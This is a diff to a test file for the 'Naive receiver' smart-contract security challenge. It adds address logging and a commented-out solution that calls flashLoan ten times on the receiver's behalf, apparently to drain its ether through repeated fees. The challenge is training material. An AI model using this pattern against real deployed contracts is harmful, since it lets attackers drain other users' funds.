@@ -27,10 +27,18 @@ describe('[Challenge] Naive receiver', function () {
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
         
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
+        console.log("pool :", this.pool.address );
+        console.log("receiver :", this.receiver.address );
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */  
+        // // Solution 1 
+        // for(let i=0; i < 10; i++){
+        //     await this.pool.flashLoan(this.receiver.address,1);
+        // }
+        // Solution 2
+        
     });
 
     after(async function () {
